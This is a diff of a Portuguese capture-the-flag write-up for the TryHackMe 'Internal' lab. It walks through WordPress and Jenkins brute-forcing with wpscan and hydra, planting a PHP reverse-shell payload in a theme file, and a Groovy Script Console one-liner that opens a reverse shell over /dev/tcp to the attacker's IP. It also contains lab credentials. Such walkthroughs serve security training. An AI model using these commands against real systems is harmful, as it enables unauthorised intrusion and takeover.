@@ -3,7 +3,7 @@ title: THM Internal Writeup
 author: Hastur
 date: 2021-09-07 23:00:00 -0300
 categories: [Writeups, Try Hack Me]
-tags: [THM, Windows, Hard, Web, WordPress, Jenkins, JS]
+tags: [THM, Windows, Hard, Web, WordPress, Jenkins, JS, PHP]
 image: /thm/thm-internal-logo.png
 alt: "THM Internal Writeup"
 ---
@@ -25,7 +25,7 @@ alt: "THM Internal Writeup"
 Na descrição do projeto, temos as instruções para adicionar `internal.thm` ao nosso `/etc/hosts` para refletirmos à pagina correta.
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.219.160 --min-rate=512
 PORT   STATE SERVICE VERSION
@@ -50,7 +50,7 @@ O nmap nos trouxe somente as portas 80 e 22, vamos começar pela porta 80.
 
 A porta 80 nos trouxe a página padrão do `Apache`, vamos fazer uma varredura com gobuster para tentar enumerar algum diretório.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
 └─$ gobuster dir -e -u http://internal.thm/ -w /usr/share/wordlists/dirb/common.txt -r
 ===============================================================
@@ -89,7 +89,7 @@ A verredura nos trouxe dois diretórios interessantes, o `/blog` e o `phpmyadmin
 
 Nos deparamos com um blog em `WordPress`, porém não temos credenciais para editá-lo, vamos varrer o blog com o `wpscan`, para tentar enumerar alguma informação ou vulnerabilidade.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
 └─$ wpscan --url http://internal.thm/blog/ -e vt,vp,u
 _______________________________________________________________
@@ -198,7 +198,7 @@ Interesting Finding(s):
 
 Encontramos o usuário `admin`, podemos fazer um bruteforce com o próprio wpscan, para tentarmos encontrar uma senha válida.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
 └─$ wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt 
 [+] Performing password attack on Xmlrpc against 1 user/s
@@ -223,7 +223,7 @@ Como o WordPress funciona sobre o PHP, vamos tentar editar alguma página de um 
 
 Em `Appearance > Theme Editor`, podemos editar a página `404.php` com um payload. No meu caso, utilizarei o payload abaixo:
 
-```
+```php
 <?php
 // Copyright (c) 2020 Ivan Šincek
 // v2.4
@@ -410,7 +410,7 @@ echo '</pre>';
 Ao clicar em `Update File`, salvamos nossas alterações. Agora setamos um `netcat` na porta 8443 do nosso payload e fazemos um curl para a página alvo.
 O wordpress salva suas páginas no endereço `/wp-content/themes/<nome do tema>/404.php`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
 └─$ curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
 ```
@@ -420,7 +420,7 @@ E conseguimos nosso shell!!!
 
 No diretório `/var/www/html/wordpress`, encontramos o arquivo `wp-config.php` que contém as credenciais para o banco de dados.
 
-```
+```php
 /** MySQL database username */
 define( 'DB_USER', 'wordpress' );
 
@@ -430,7 +430,7 @@ define( 'DB_PASSWORD', 'wordpress123' );
 
 Ao enumerar arquivos no host, ecnontramos o arquivo `wp-save.txt` no diretório `/opt`, este arquivo contém uma mensagem que contém as credenciais `aubreanna:bubb13guM!@#123`
 
-```
+```bash
 www-data@internal:/opt$ cat wp-save.txt
 cat wp-save.txt
 Bill,
@@ -447,7 +447,7 @@ E conseguimos um acesso válido via SSH!!!
 
 No diretório do usuário auberanna, encontramos a flag `user.txt`.
 
-```
+```bash
 aubreanna@internal:~$ ls -la
 total 56
 drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
@@ -468,14 +468,14 @@ drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
 ```
 No mesmo diretório do usuário, também encontramos o arquivo `jenkins.txt`, que informa que o serviço `Jenkis` está rodando localmente em outro server na porta `8080`.
 
-```
+```bash
 aubreanna@internal:~$ cat jenkins.txt
 Internal Jenkins service is running on 172.17.0.2:8080
 ```
 
 Ao enumerar os serviços rodando localmente, também encontramos algo rodando na porta 8080.
 
-```
+```bash
 aubreanna@internal:~$ netstat -plnt
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
@@ -491,7 +491,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 ```
 Podemos redirecionar esta porta, para nossa própria porta 8080 via SSH.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
 └─$ ssh -L 8080:localhost:8080 aubreanna@internal.thm 
 ```
@@ -509,7 +509,7 @@ Primeiro precisamos verificar os parâmetros de login e senha e a mensagem de er
 
 Vamos iniciar o bruteforce com o usuário `admin`, que foi onde conseguimos o primeiro acesso.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
 └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -528,7 +528,7 @@ Ao efetuarmos o login na plataforma, podemos navegar até a opção `Script Cons
 
 <img src="/thm/thm-internal-10.png">
 
-```
+```js
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.9.0.25/8444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
@@ -542,7 +542,7 @@ Ao rodar o script, conseguimos nosso reverse shell.
 
 Após um tempo de enumeração local, encontrei novamente uma mensagem no diretório `/opt`.
 
-```
+```bash
 pwd
 /opt
 ls -la
@@ -557,7 +557,7 @@ Will wanted these credentials secured behind the Jenkins container since we have
 need access to the root user account.
 
 root:tr0ub13guM!@#123
-```
+```bash
 Encontramos uma credencial de `root`.
 Podemos voltar para o terminal com SSH do usuário `aubreanna`. e tentar nos autenticar como administrador.
 
